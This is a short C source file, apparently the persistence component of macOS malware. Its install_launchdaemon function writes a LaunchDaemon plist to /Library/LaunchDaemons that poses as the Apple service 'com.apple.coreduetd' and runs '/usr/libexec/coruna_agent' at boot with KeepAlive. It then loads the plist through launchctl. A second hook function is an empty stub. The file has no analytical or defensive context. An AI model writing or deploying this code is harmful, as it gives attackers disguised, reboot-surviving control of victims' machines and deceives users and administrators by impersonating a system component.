#include "persistence.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
void install_launchdaemon(void) {
    const char *plist = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n"
        "<!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" "
        "\"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">\n"
        "<plist version=\"1.0\"><dict>\n"
        "    <key>Label</key><string>com.apple.coreduetd</string>\n"
        "    <key>ProgramArguments</key><array>\n"
        "        <string>/usr/libexec/coruna_agent</string>\n"
        "    </array>\n"
        "    <key>RunAtLoad</key><true/>\n"
        "    <key>KeepAlive</key><true/>\n"
        "</dict></plist>\n";
    FILE *fp = fopen("/Library/LaunchDaemons/com.apple.coreduetd.plist", "w");
    if (fp) { fwrite(plist, 1, strlen(plist), fp); fclose(fp); system("launchctl load /Library/LaunchDaemons/com.apple.coreduetd.plist"); }
}
void hook_system_daemon(void) {}
